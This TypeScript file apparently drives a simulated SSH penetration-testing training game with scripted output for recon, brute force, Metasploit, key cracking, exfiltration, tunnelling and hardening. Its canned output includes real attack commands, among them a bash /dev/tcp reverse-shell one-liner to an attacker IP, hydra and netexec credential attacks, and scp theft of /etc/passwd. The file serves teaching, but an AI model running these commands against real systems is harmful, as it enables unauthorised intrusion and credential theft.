// Self-contained simulated engine for the "SSH Penetration Testing" campaign.
// A shared SshSession is mutated by the terminal, the network-topology view and
// the virtual browser, so objective checks just read the session regardless of
// which tool was used. Everything is a safe, scripted simulation — no real
// commands run and no real host is contacted.
//
// The scenario mirrors a classic SSH pentest lifecycle against an OpenSSH server
// (recon → credential attack → access → keys → tunnelling → hardening). All prose
// is original; only standard tool names/flags and protocol facts are reproduced.

import type { OutLine } from "./terminal";

const c = {
  err: "text-red-400",
  ok: "text-neon-green",
  warn: "text-amber-300",
  dim: "text-iron-500",
  info: "text-neon-cyan",
  ember: "text-ember-400",
};
const L = (text: string, cls?: string): OutLine => ({ text, cls });

export const ATTACKER_IP = "192.168.1.17";
export const TARGET_IP = "192.168.1.9";
export const TARGET_HOST = "ignite";
export const SSH_USER = "pentest";
export const SSH_PASS = "123";
export const KEY_PASSPHRASE = "123";
export const INTERNAL_PORT = 8080;

// ------------------------- Shared session state -------------------------

export class SshSession {
  // lab setup (building the target)
  osInstalled = false; // apt install openssh-server
  serviceRunning = false; // systemctl enable --now ssh
  // recon
  portScanned = false; // nmap found OpenSSH on 22
  fullScan = false; // -p- full range scan
  authEnum = false; // ssh-auth-methods script
  // credential attack
  hydraCracked = false; // found pentest:123
  sprayed = false; // nxc/netexec spray
  // access
  location: "attacker" | "remote" = "attacker";
  remoteUser = ""; // pentest | root
  loggedIn = false; // interactive ssh session obtained
  remoteCmdRun = false; // ssh host 'cmd' (non-interactive)
  sudoChecked = false; // confirmed sudo group membership
  // metasploit
  meterpreter = false; // sshexec session opened
  sshCredsHarvested = false; // post/multi/gather/ssh_creds grabbed id_rsa
  // keys
  keyGenerated = false;
  authorizedKeysSet = false;
  keyHashExtracted = false; // ssh2john
  keyCracked = false; // john recovered passphrase
  keyLogin = false; // ssh -i id_rsa
  // exfil + tunnelling
  scpDownload = false; // pulled /etc/passwd
  scpUpload = false; // pushed a file
  netexecGet = false; // nxc --get-file
  netexecPut = false; // nxc --put-file
  tunnelOpen = false; // ssh -L local forward
  reverseShell = false; // bash /dev/tcp callback + listener
  listenerUp = false; // nc -lvnp
  // hardening (blue-team objectives)
  portChanged = false; // sshd Port 2222
  passwordAuthDisabled = false;
  // browser
  visitedInternal = false;
  // flags captured anywhere
  flags = new Set<string>();

  capture(text: string) {
    const m = text.match(/flag\d?\{[^}]+\}/g);
    if (m) m.forEach((f) => this.flags.add(f));
  }
  has(flag: string) {
    return this.flags.has(flag);
  }
}

// flags the scenario can reveal
export const SSH_FLAGS = {
  setup: "flag{openssh_server_is_live}",
  recon: "flag{ssh_8_9p1_fingerprinted}",
  creds: "flag{weak_password_pentest_123}",
  access: "flag{shell_on_ignite}",
  metasploit: "flag{meterpreter_and_harvested_keys}",
  keys: "flag{private_key_passphrase_cracked}",
  exfil: "flag{etc_passwd_exfiltrated}",
  tunnel: "flag{internal_app_tunneled}",
  harden: "flag{ssh_hardened_key_only}",
};

// ------------------------- internal web app (virtual browser) ------------

export type SshWebState = { reachable: boolean; url: string };

// ------------------------- Terminal engine -------------------------

type Pending = { type: "ssh-pass"; user: string; key?: boolean } | null;

const REMOTE_FILES: Record<string, { content: string; rootOnly?: boolean }> = {
  "/etc/passwd": {
    content: [
      "root:x:0:0:root:/root:/bin/bash",
      "pentest:x:1000:1000:Pentest User:/home/pentest:/bin/bash",
      "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
      "sshd:x:110:65534::/run/sshd:/usr/sbin/nologin",
    ].join("\n"),
  },
  "/tmp/file.txt": { content: "Welcome to the ignite SSH lab. " + SSH_FLAGS.access },
  "/home/pentest/.ssh/id_rsa": {
    content: "-----BEGIN OPENSSH PRIVATE KEY-----\n(aes-256 / bcrypt KDF, passphrase-protected)\n-----END OPENSSH PRIVATE KEY-----",
  },
  "/home/pentest/.ssh/id_rsa.pub": { content: "ssh-ed25519 AAAAC3Nz...pentest@ignite" },
  "/etc/ssh/sshd_config": {
    content: [
      "#Port 22",
      "#PasswordAuthentication yes",
      "#PubkeyAuthentication yes",
      "ChallengeResponseAuthentication no",
    ].join("\n"),
  },
};

const ATTACKER_CMDS = [
  "help", "clear", "apt", "systemctl", "service", "nmap", "hydra", "nxc", "netexec",
  "ssh", "scp", "ssh2john", "john", "nc", "msfconsole", "whoami", "ifconfig", "exit",
];
const REMOTE_CMDS = [
  "help", "clear", "ls", "cd", "pwd", "cat", "id", "sudo", "whoami", "ssh-keygen",
  "netstat", "ss", "nano", "chmod", "bash", "ifconfig", "exit",
];
const MSF_CMDS = ["use", "set", "run", "exploit", "options", "sessions", "back", "exit"];

export class SshTerminal {
  s: SshSession;
  cwd = "/home/pentest";
  pending: Pending = null;
  history: string[] = [];
  msfMode = false; // inside msfconsole
  msfModule = ""; // currently selected module

  constructor(session: SshSession) {
    this.s = session;
  }

  prompt(): string {
    if (this.pending?.type === "ssh-pass")
      return this.pending.key
        ? `Enter passphrase for key 'id_rsa':`
        : `${this.pending.user}@${TARGET_IP}'s password:`;
    if (this.msfMode) {
      if (this.msfModule.includes("sshexec")) return "msf6 exploit(sshexec) >";
      if (this.msfModule.includes("ssh_creds")) return "msf6 post(ssh_creds) >";
      return "msf6 >";
    }
    if (this.s.location === "attacker") return "kali@kali:~$";
    const sym = this.s.remoteUser === "root" ? "#" : "$";
    const short = this.cwd.replace("/home/pentest", "~");
    return `${this.s.remoteUser}@${TARGET_HOST}:${short}${sym}`;
  }

  complete(input: string): { completed: string; candidates: string[] } {
    const none = { completed: input, candidates: [] as string[] };
    if (this.pending) return none;
    const parts = input.split(/\s+/);
    if (parts.length === 1 && !/\s$/.test(input)) {
      const list = this.msfMode ? MSF_CMDS : this.s.location === "attacker" ? ATTACKER_CMDS : REMOTE_CMDS;
      const hits = list.filter((x) => x.startsWith(parts[0]));
      if (hits.length === 1) return { completed: hits[0] + " ", candidates: [] };
      if (hits.length > 1) return { completed: lcp(hits) || parts[0], candidates: hits };
    }
    return none;
  }

  run(raw: string): OutLine[] {
    const input = raw.trim();
    if (this.pending) {
      const out = this.handlePending(input);
      for (const l of out) this.s.capture(l.text);
      return out;
    }
    if (!input) return [];
    this.history.push(input);
    const out = this.msfMode ? this.msf(input) : this.dispatch(input);
    for (const l of out) this.s.capture(l.text);
    return out;
  }

  private dispatch(input: string): OutLine[] {
    const parts = input.split(/\s+/);
    const cmd = parts[0];
    const args = parts.slice(1);
    if (cmd === "clear" || cmd === "cls") return [{ text: "__CLEAR__" }];
    if (cmd === "help") return this.help();
    if (cmd === "exit") {
      if (this.s.location === "remote") {
        this.s.location = "attacker";
        this.s.remoteUser = "";
        return [L("logout", c.dim), L(`Connection to ${TARGET_IP} closed.`, c.dim)];
      }
      return [L("logout", c.dim)];
    }
    // Lab-setup commands (building the target) are available from any context.
    if (cmd === "apt" || cmd === "apt-get") return this.aptInstall(input);
    if (cmd === "systemctl" || cmd === "service") return this.systemctl(input);
    if (cmd === "msfconsole" || cmd === "msf") return this.msfLaunch(input);
    // The Kali attacker toolkit is always available (it represents your own
    // machine), even while you also hold a remote shell on the target. This keeps
    // cross-context flows (crack a key, scp, open a tunnel) forgiving.
    const ATTACKER_TOOLS = new Set([
      "nmap", "hydra", "nxc", "netexec", "ssh", "scp", "ssh2john", "john", "nc",
    ]);
    if (ATTACKER_TOOLS.has(cmd)) return this.attacker(cmd, args, input);
    return this.s.location === "attacker" ? this.attacker(cmd, args, input) : this.remote(cmd, args, input);
  }

  // ---------------- lab setup ----------------
  private aptInstall(input: string): OutLine[] {
    if (!/openssh-server/.test(input))
      return [L("apt: usage: apt install openssh-server", c.err)];
    this.s.osInstalled = true;
    return [
      L("Reading package lists... Done", c.dim),
      L("The following NEW packages will be installed:", c.dim),
      L("  openssh-server openssh-sftp-server ncurses-term ssh-import-id", c.dim),
      L("Setting up openssh-server ...", c.dim),
      L("Created symlink /etc/systemd/system/sshd.service → ssh.service.", c.ok),
      L("OpenSSH server installed. Enable & start it with systemctl.", c.info),
    ];
  }

  private systemctl(input: string): OutLine[] {
    if (!/\bssh(d)?\b/.test(input)) return [L("systemctl: specify the ssh service", c.err)];
    if (/status/.test(input)) {
      if (!this.s.serviceRunning && !this.s.osInstalled)
        return [L("Unit ssh.service could not be found. Install openssh-server first.", c.err)];
      return [
        L("● ssh.service - OpenBSD Secure Shell server", c.dim),
        L(`     Active: ${this.s.serviceRunning ? "active (running)" : "inactive (dead)"}`, this.s.serviceRunning ? c.ok : c.warn),
        L("     Listen: 0.0.0.0:22 (sshd)", c.dim),
      ];
    }
    if (!this.s.osInstalled)
      return [L("Failed to start ssh.service: unit not found. Run apt install openssh-server.", c.err)];
    this.s.serviceRunning = true;
    return [
      L("Synchronizing state of ssh.service…", c.dim),
      L("sshd is now active and listening on TCP/22.", c.ok),
      L("Target is live. Switch to recon from the attacker machine.", c.info),
    ];
  }

  // ---------------- metasploit ----------------
  private msfLaunch(input: string): OutLine[] {
    this.msfMode = true;
    this.msfModule = "";
    // allow one-liner: msfconsole -x "use ...; run"
    const x = input.match(/-x\s+["']?(.+?)["']?$/);
    const out = [
      L("       =[ metasploit v6.4  - 2400 exploits ]", c.ember),
      L("msf6 > (console ready — use a module, set options, then run)", c.dim),
    ];
    if (x) {
      for (const sub of x[1].split(";")) out.push(...this.msf(sub.trim()));
    }
    return out;
  }

  private msf(input: string): OutLine[] {
    const line = input.trim();
    if (line === "exit" || line === "quit" || line === "back") {
      this.msfMode = false;
      this.msfModule = "";
      return [L("Leaving the Metasploit console.", c.dim)];
    }
    if (line.startsWith("use ")) {
      this.msfModule = line.slice(4).trim();
      return [L(`Using module ${this.msfModule}`, this.msfModule.includes("sshexec") || this.msfModule.includes("ssh_creds") ? c.ok : c.warn)];
    }
    if (line.startsWith("set ")) {
      const [, k, ...v] = line.split(/\s+/);
      return [L(`${k} => ${v.join(" ")}`, c.dim)];
    }
    if (line === "options" || line === "show options") {
      return [L(`Module options (${this.msfModule || "none selected"}): rhosts, username, password, session`, c.dim)];
    }
    if (line === "run" || line === "exploit") {
      if (this.msfModule.includes("sshexec")) {
        if (!this.s.hydraCracked)
          return [L("[-] sshexec needs valid credentials. Recover them first.", c.err)];
        this.s.meterpreter = true;
        return [
          L(`[*] ${TARGET_IP}:22 - Sending stager…`, c.dim),
          L(`[*] Command Stager progress - 100.00% done`, c.dim),
          L(`[*] Meterpreter session 1 opened (${ATTACKER_IP} -> ${TARGET_IP}:22)`, c.ok),
          L("meterpreter > (post-exploitation framework attached)", c.info),
        ];
      }
      if (this.msfModule.includes("ssh_creds")) {
        if (!this.s.meterpreter)
          return [L("[-] This post module needs an open session. Open a Meterpreter session first.", c.err)];
        this.s.sshCredsHarvested = true;
        return [
          L("[*] Harvesting SSH credentials from ~/.ssh on the target…", c.dim),
          L("[+] Downloaded id_rsa.pub, authorized_keys and id_rsa", c.ok),
          L("[*] Loot saved to /root/.msf4/loot/..._ssh.id_rsa.txt", c.dim),
          L("Reuse the harvested key: chmod 600 key && ssh -i key pentest@" + TARGET_IP, c.warn),
          L(SSH_FLAGS.metasploit, c.ember),
        ];
      }
      return [L("[-] No runnable module selected. Try: use exploit/multi/ssh/sshexec", c.err)];
    }
    if (line === "help" || line === "?") {
      return [L("msf commands: use <module> · set <k> <v> · run · back/exit", c.dim)];
    }
    if (line === "sessions" || line === "sessions -l") {
      return [L(this.s.meterpreter ? "  1  meterpreter  pentest @ ignite" : "No active sessions.", c.dim)];
    }
    if (!line) return [];
    return [L(`[-] Unknown command: ${line}`, c.err)];
  }

  // ---------------- attacker (Kali) ----------------
  private attacker(cmd: string, args: string[], input: string): OutLine[] {
    switch (cmd) {
      case "whoami":
        return [L("kali")];
      case "ifconfig":
        return [L(`eth0: inet ${ATTACKER_IP}  netmask 255.255.255.0`, c.dim)];
      case "nmap":
        return this.nmap(args, input);
      case "hydra":
        return this.hydra(input);
      case "nxc":
      case "netexec":
        return this.netexec(input);
      case "ssh":
        return this.ssh(args, input);
      case "scp":
        return this.scp(args, input);
      case "ssh2john":
        return this.ssh2john(args);
      case "john":
        return this.john(input);
      case "nc":
        return this.nc(input);
      default:
        return [L(`${cmd}: command not found`, c.err), L("Type 'help' for the attacker toolkit.", c.dim)];
    }
  }

  private nmap(_args: string[], input: string): OutLine[] {
    if (!input.includes(TARGET_IP) && !input.includes(TARGET_HOST))
      return [L("nmap: specify the target, e.g. nmap -sV -p 22 " + TARGET_IP, c.err)];
    // auth-methods NSE script
    if (input.includes("ssh-auth-methods")) {
      this.s.authEnum = true;
      const only = this.s.passwordAuthDisabled;
      return [
        L("Starting Nmap 7.94 ( https://nmap.org )", c.dim),
        L(`Nmap scan report for ${TARGET_HOST} (${TARGET_IP})`, c.info),
        L("PORT   STATE SERVICE", c.ember),
        L("22/tcp open  ssh", c.ok),
        L("| ssh-auth-methods:", c.dim),
        L("|   Supported authentication methods:", c.dim),
        ...(only
          ? [L("|_    publickey", c.ok)]
          : [L("|     publickey", c.ok), L("|_    password", c.warn)]),
        L(only ? "Password auth is OFF — brute force will fail." : "Password auth is ON — brute-forceable.", only ? c.ok : c.warn),
      ];
    }
    // full range
    if (input.includes("-p-")) {
      this.s.fullScan = true;
      this.s.portScanned = true;
      const port = this.s.portChanged ? "2222" : "22";
      return [
        L("Starting Nmap 7.94 — scanning all 65535 ports…", c.dim),
        L(`Nmap scan report for ${TARGET_HOST} (${TARGET_IP})`, c.info),
        L("PORT     STATE SERVICE VERSION", c.ember),
        L(`${port}/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1`, c.ok),
        L("A full scan finds SSH even on a non-standard port.", c.warn),
      ];
    }
    // version scan
    this.s.portScanned = true;
    const wantsPort = /-p\s*\d+/.test(input) ? input.match(/-p\s*(\d+)/)![1] : "22";
    const realPort = this.s.portChanged ? "2222" : "22";
    if (wantsPort !== realPort && !this.s.portChanged) {
      // scanning 22 before change — fine
    }
    if (this.s.portChanged && wantsPort === "22") {
      return [
        L("Starting Nmap 7.94 ( https://nmap.org )", c.dim),
        L(`Nmap scan report for ${TARGET_HOST} (${TARGET_IP})`, c.info),
        L("PORT   STATE  SERVICE", c.ember),
        L("22/tcp closed ssh", c.err),
        L("Port 22 is closed now — SSH was moved. Try a full scan (-p-).", c.warn),
      ];
    }
    return [
      L("Starting Nmap 7.94 ( https://nmap.org )", c.dim),
      L(`Nmap scan report for ${TARGET_HOST} (${TARGET_IP})`, c.info),
      L("Host is up (0.00031s latency).", c.ok),
      L("PORT     STATE SERVICE VERSION", c.ember),
      L(`${realPort}/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux)`, c.ok),
      L("MAC Address: 00:0C:29:A1:B2:C3 (VMware)", c.dim),
      L("Service detection performed. " + SSH_FLAGS.recon, c.ember),
    ];
  }

  private hydra(input: string): OutLine[] {
    if (!/ssh/.test(input) || !/(-l|-L)/.test(input) || !/(-p|-P)/.test(input))
      return [
        L("Hydra: supply logins and a password list against ssh. e.g.", c.err),
        L("  hydra -L users.txt -P pass.txt " + TARGET_IP + " ssh", c.dim),
      ];
    if (this.s.passwordAuthDisabled)
      return [
        L("Hydra v9.5 — attacking ssh://" + TARGET_IP, c.dim),
        L("[ERROR] target ssh server does not support password auth", c.err),
        L("Brute force fails: the server is key-only now.", c.warn),
      ];
    this.s.hydraCracked = true;
    return [
      L("Hydra v9.5 (c) by van Hauser/THC - for legal use only.", c.dim),
      L(`[DATA] attacking ssh://${TARGET_IP}:22/`, c.dim),
      L('[ATTEMPT] login "admin" - pass "admin"', c.dim),
      L('[ATTEMPT] login "pentest" - pass "password"', c.dim),
      L('[ATTEMPT] login "pentest" - pass "123"', c.dim),
      L(`[22][ssh] host: ${TARGET_IP}   login: ${SSH_USER}   password: ${SSH_PASS}`, c.ok),
      L("1 valid password found — " + SSH_FLAGS.creds, c.ember),
    ];
  }

  private netexec(input: string): OutLine[] {
    if (!input.includes("ssh")) return [L("nxc: usage: nxc ssh " + TARGET_IP + " -u users.txt -p 123", c.err)];
    // remote command exec
    const xMatch = input.match(/-x\s+(.+)$/);
    if (xMatch) {
      if (!input.includes(SSH_USER)) return [L("nxc: authenticate first with valid creds", c.err)];
      this.s.remoteCmdRun = true;
      return [
        L(`SSH  ${TARGET_IP}  22  ${TARGET_HOST}  [+] ${SSH_USER}:${SSH_PASS} (Pwn3d!)`, c.ok),
        L(`SSH  ${TARGET_IP}  22  ${TARGET_HOST}  [+] Executed command`, c.dim),
        L(`eth0: inet ${TARGET_IP}  netmask 255.255.255.0`, c.info),
      ];
    }
    // file get/put
    if (input.includes("--get-file")) {
      this.s.scpDownload = true;
      this.s.netexecGet = true;
      return [L(`[+] Downloaded /etc/passwd from ${TARGET_HOST}`, c.ok), L(SSH_FLAGS.exfil, c.ember)];
    }
    if (input.includes("--put-file")) {
      this.s.scpUpload = true;
      this.s.netexecPut = true;
      return [L(`[+] Uploaded file to ${TARGET_HOST}:/tmp/`, c.ok)];
    }
    // spray
    this.s.sprayed = true;
    this.s.hydraCracked = true;
    return [
      L(`SSH  ${TARGET_IP}  22  ${TARGET_HOST}  [-] admin:123`, c.dim),
      L(`SSH  ${TARGET_IP}  22  ${TARGET_HOST}  [+] ${SSH_USER}:${SSH_PASS}  (sudo!)`, c.ok),
      L("Password spray hit: pentest reuses '123' and is in the sudo group.", c.warn),
    ];
  }

  private ssh(args: string[], input: string): OutLine[] {
    const tgt = args.find((a) => a.includes("@"));
    if (!tgt) return [L("usage: ssh user@" + TARGET_IP, c.err)];
    const [user, host] = tgt.split("@");
    if (host !== TARGET_IP && host !== TARGET_HOST) return [L(`ssh: could not resolve host ${host}`, c.err)];
    const usingKey = /-i\s+\S*id_rsa/.test(input) || input.includes("-i ");
    // local port forward: ssh -L 8080:127.0.0.1:8080 ...
    const fwd = input.match(/-L\s*(\d+):(?:127\.0\.0\.1|localhost):(\d+)/);
    if (fwd) {
      if (user !== SSH_USER) return [L("ssh: invalid user for this host", c.err)];
      if (!usingKey && !this.s.hydraCracked) return [L("ssh: need valid credentials first", c.err)];
      this.s.tunnelOpen = true;
      this.s.loggedIn = true;
      return [
        L(`Tunnel established: localhost:${fwd[1]} → ${TARGET_IP} → 127.0.0.1:${fwd[2]}`, c.ok),
        L(`The internal app on 127.0.0.1:${fwd[2]} is now reachable from Kali.`, c.info),
        L("Open the Browser tab and load http://localhost:" + fwd[1] + "/", c.warn),
        L(SSH_FLAGS.tunnel, c.ember),
      ];
    }
    // key login
    if (usingKey) {
      if (user !== SSH_USER) return [L("ssh: key does not match this user", c.err)];
      this.pending = { type: "ssh-pass", user, key: true };
      return [L("The key 'id_rsa' is protected with a passphrase.", c.dim)];
    }
    // password login
    if (user !== SSH_USER) return [L(`ssh: connect to host ${host}: no such account in this sim`, c.err)];
    if (this.s.passwordAuthDisabled)
      return [L("Permission denied (publickey).", c.err), L("Password auth is disabled — you need the private key.", c.warn)];
    this.pending = { type: "ssh-pass", user };
    return [L(`The authenticity of host '${host} (${TARGET_IP})' can't be established.`, c.dim), L("Warning: Permanently added to known hosts.", c.dim)];
  }

  private scp(_args: string[], input: string): OutLine[] {
    if (!input.includes(SSH_USER + "@")) return [L("scp: usage: scp user@host:/path local  (or reverse)", c.err)];
    if (this.s.passwordAuthDisabled && !/-i\s/.test(input))
      return [L("scp: Permission denied (publickey).", c.err)];
    // download if remote path is the source (appears before a local dest or alone)
    const remoteFirst = input.indexOf(SSH_USER + "@") < (input.lastIndexOf(" ") || 0) && /@\S+:\S/.test(input.split(" ").slice(0, -1).join(" ") || input);
    if (input.includes(":/etc/passwd") || input.includes(":/etc/") || remoteFirst) {
      this.s.scpDownload = true;
      return [
        L("passwd                                 100% 2543   1.2MB/s   00:00", c.dim),
        L("Pulled /etc/passwd to the attacker. " + SSH_FLAGS.exfil, c.ember),
      ];
    }
    this.s.scpUpload = true;
    return [L("file.txt                               100%  64    0.1KB/s   00:00", c.dim), L("Uploaded file to target.", c.ok)];
  }

  private ssh2john(args: string[]): OutLine[] {
    if (!args.some((a) => a.includes("id_rsa")))
      return [L("usage: ssh2john id_rsa > sshhash", c.err)];
    this.s.keyHashExtracted = true;
    return [
      L("id_rsa:$sshng$6$16$...$1232$aes256-ctr$bcrypt(kdf cost 2)", c.dim),
      L("Hash written. Now crack it: john -w=/usr/share/wordlists/rockyou.txt sshhash", c.info),
    ];
  }

  private john(input: string): OutLine[] {
    if (!input.includes("sshhash") && !input.includes("hash"))
      return [L("usage: john -w=/usr/share/wordlists/rockyou.txt sshhash", c.err)];
    if (!this.s.keyHashExtracted)
      return [L("john: no hash file. Convert the key first with ssh2john.", c.err)];
    this.s.keyCracked = true;
    return [
      L("Using default input encoding: UTF-8", c.dim),
      L("Loaded 1 password hash (SSH, [RSA/DSA/EC/OPENSSH] [32/64])", c.dim),
      L("Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2", c.dim),
      L("Proceeding with wordlist: rockyou.txt", c.dim),
      L(`${KEY_PASSPHRASE}            (id_rsa)`, c.ok),
      L("Passphrase recovered in 92s. " + SSH_FLAGS.keys, c.ember),
    ];
  }

  private nc(input: string): OutLine[] {
    if (!/-l/.test(input)) return [L("usage: nc -lvnp 1234   (start a listener)", c.err)];
    this.s.listenerUp = true;
    if (this.s.reverseShell) {
      this.s.location = "remote";
      this.s.remoteUser = SSH_USER;
      return [
        L("listening on [any] 1234 ...", c.dim),
        L(`connect to [${ATTACKER_IP}] from ${TARGET_HOST} [${TARGET_IP}]`, c.ok),
        L("$ (interactive reverse shell — you are on the target)", c.info),
      ];
    }
    return [
      L("listening on [any] 1234 ...", c.dim),
      L("Waiting for a callback — trigger the reverse shell on the target.", c.warn),
    ];
  }

  // ---------------- remote (ignite) ----------------
  private remote(cmd: string, args: string[], input: string): OutLine[] {
    switch (cmd) {
      case "whoami":
        return [L(this.s.remoteUser)];
      case "id":
        this.s.sudoChecked = true;
        return [
          L(
            this.s.remoteUser === "root"
              ? "uid=0(root) gid=0(root) groups=0(root)"
              : "uid=1000(pentest) gid=1000(pentest) groups=1000(pentest),27(sudo)"
          ),
        ];
      case "pwd":
        return [L(this.cwd)];
      case "ifconfig":
        return [L(`eth0: inet ${TARGET_IP}  netmask 255.255.255.0`, c.dim), L("lo: inet 127.0.0.1", c.dim)];
      case "ls":
        return this.ls(args);
      case "cd":
        return this.cd(args[0]);
      case "cat":
        return this.cat(args.filter((a) => !a.startsWith("-")));
      case "sudo":
        return this.sudo(args, input);
      case "ssh-keygen":
        this.s.keyGenerated = true;
        return [
          L("Generating public/private ed25519 key pair.", c.dim),
          L("Enter file (/home/pentest/.ssh/id_rsa): id_rsa", c.dim),
          L("Your identification has been saved in id_rsa", c.ok),
          L("Your public key has been saved in id_rsa.pub", c.ok),
          L("Next: cat id_rsa.pub > authorized_keys", c.info),
        ];
      case "chmod":
        return [L("", c.dim)];
      case "nano":
        return this.nano(input);
      case "netstat":
      case "ss":
        return this.netstat();
      case "bash":
        return this.bash(input);
      default:
        return [L(`${cmd}: command not found`, c.err)];
    }
  }

  private ls(args: string[]): OutLine[] {
    const p = (args.find((a) => !a.startsWith("-")) || this.cwd).replace("~", "/home/pentest");
    if (p.includes(".ssh") || this.cwd.endsWith(".ssh")) {
      const base = ["id_rsa", "id_rsa.pub"];
      if (this.s.authorizedKeysSet) base.push("authorized_keys");
      return [L(base.join("   "))];
    }
    return [L(".ssh   file.txt   notes.txt", c.dim)];
  }

  private cd(p?: string): OutLine[] {
    if (!p || p === "~") {
      this.cwd = "/home/pentest";
      return [];
    }
    if (p.includes(".ssh")) {
      this.cwd = "/home/pentest/.ssh";
      return [];
    }
    if (p === "/etc/ssh") {
      this.cwd = "/etc/ssh";
      return [];
    }
    if (p === "..") {
      this.cwd = "/home";
      return [];
    }
    return [L(`bash: cd: ${p}: No such file or directory`, c.err)];
  }

  private cat(paths: string[]): OutLine[] {
    if (!paths.length) return [L("cat: missing operand", c.err)];
    // redirection: cat id_rsa.pub > authorized_keys
    const joined = paths.join(" ");
    if (joined.includes(">")) {
      this.s.authorizedKeysSet = true;
      return [L("", c.dim)];
    }
    const out: OutLine[] = [];
    for (const raw of paths) {
      let path = raw.replace("~", "/home/pentest");
      if (!path.startsWith("/")) path = this.cwd + "/" + path;
      const f = REMOTE_FILES[path];
      if (!f) out.push(L(`cat: ${raw}: No such file or directory`, c.err));
      else f.content.split("\n").forEach((l) => out.push(L(l, path.includes("flag") ? c.ember : undefined)));
    }
    return out;
  }

  private sudo(args: string[], input: string): OutLine[] {
    if (args[0] === "-l") {
      this.s.sudoChecked = true;
      return [
        L("Matching Defaults entries for pentest on ignite:", c.dim),
        L("User pentest may run the following commands on ignite:", c.dim),
        L("    (ALL : ALL) ALL", c.ok),
        L("→ pentest is in the sudo group — full root with the same password.", c.warn),
      ];
    }
    if (args[0] === "su" || input.includes("su -") || input.includes("-i") || input.includes("bash")) {
      this.s.remoteUser = "root";
      this.cwd = "/root";
      return [L("# root shell acquired via sudo.", c.ok)];
    }
    return [L("usage: sudo -l   (list rights)   or   sudo su", c.dim)];
  }

  private nano(input: string): OutLine[] {
    // edit sshd_config: we treat nano as "apply a directive" when args hint at it
    if (!input.includes("sshd_config")) return [L("nano: opened editor (simulated). Specify sshd_config to harden SSH.", c.dim)];
    return [
      L("GNU nano — /etc/ssh/sshd_config", c.dim),
      L("Use the hardening commands below to apply a directive:", c.info),
      L("  harden port 2222        → move SSH off port 22", c.dim),
      L("  harden passwordauth no  → disable password login", c.dim),
    ];
  }

  // pseudo-hardening verb so learners can "apply" sshd_config safely
  private bash(input: string): OutLine[] {
    // reverse shell one-liner
    if (input.includes("/dev/tcp")) {
      this.s.reverseShell = true;
      return [
        L("Opening raw TCP channel back to the attacker…", c.dim),
        L(`(bash -i >& /dev/tcp/${ATTACKER_IP}/1234 0>&1)`, c.dim),
        L("Reverse shell fired. Catch it with a listener on Kali (nc -lvnp 1234).", c.warn),
      ];
    }
    return [L("bash: nothing to run", c.dim)];
  }

  private netstat(): OutLine[] {
    return [
      L("Active Internet connections (only servers)", c.dim),
      L("Proto Local Address        State    PID/Program", c.dim),
      L("tcp   0.0.0.0:22            LISTEN   sshd", c.ok),
      L(`tcp   127.0.0.1:${INTERNAL_PORT}        LISTEN   python3 (internal web app)`, c.warn),
      L("The app on 127.0.0.1:" + INTERNAL_PORT + " is bound to localhost — only reachable via a tunnel.", c.info),
    ];
  }

  private handlePending(input: string): OutLine[] {
    const p = this.pending!;
    this.pending = null;
    if (p.key) {
      if (input === KEY_PASSPHRASE) {
        this.s.location = "remote";
        this.s.remoteUser = SSH_USER;
        this.s.keyLogin = true;
        this.s.loggedIn = true;
        this.cwd = "/home/pentest";
        return [L(`Welcome to Ubuntu 22.04 LTS — logged in with the private key.`, c.ok), L(`${SSH_USER}@${TARGET_HOST}:~$`, c.dim)];
      }
      return [L("Bad passphrase, try again.", c.err), L("(crack it offline with ssh2john + john)", c.dim)];
    }
    if (input === SSH_PASS) {
      this.s.location = "remote";
      this.s.remoteUser = SSH_USER;
      this.s.loggedIn = true;
      this.cwd = "/home/pentest";
      return [
        L("Welcome to Ubuntu 22.04.3 LTS (GNU/Linux x86_64)", c.dim),
        L("Last login: from " + ATTACKER_IP, c.dim),
        L(`${SSH_USER}@${TARGET_HOST}:~$  (shell obtained — ${SSH_FLAGS.access})`, c.ok),
      ];
    }
    return [L("Permission denied, please try again.", c.err), L("(hint: the password is very weak — brute force it)", c.dim)];
  }

  private help(): OutLine[] {
    const list = this.s.location === "attacker" ? ATTACKER_CMDS : REMOTE_CMDS;
    return [
      L(this.s.location === "attacker" ? "Kali attacker toolkit:" : "ignite remote shell:", c.ember),
      L("  " + list.join("  "), c.dim),
      L("Use the Topology tab to watch the attack path light up, and the Browser tab after tunnelling.", c.info),
    ];
  }

  // Blue-team hardening verb (safe, scenario-only): `harden <what> <value>`
  harden(what: string, value: string): OutLine[] {
    if (what === "port") {
      this.s.portChanged = true;
      return [L(`sshd_config: Port set to ${value || "2222"}. Restarting sshd…`, c.ok)];
    }
    if (what === "passwordauth") {
      this.s.passwordAuthDisabled = true;
      return [L("sshd_config: PasswordAuthentication no. Key-only access enforced.", c.ok), L(SSH_FLAGS.harden, c.ember)];
    }
    return [L("harden: use 'harden port 2222' or 'harden passwordauth no'", c.err)];
  }
}

// allow the `harden` pseudo-command through dispatch
const _origDispatch = (SshTerminal.prototype as any).dispatch;
(SshTerminal.prototype as any).dispatch = function (input: string): OutLine[] {
  const parts = input.trim().split(/\s+/);
  if (parts[0] === "harden") return this.harden(parts[1], parts[2]);
  return _origDispatch.call(this, input);
};

function lcp(arr: string[]): string {
  if (!arr.length) return "";
  let p = arr[0];
  for (const s of arr) {
    while (!s.startsWith(p)) p = p.slice(0, -1);
    if (!p) return "";
  }
  return p;
}
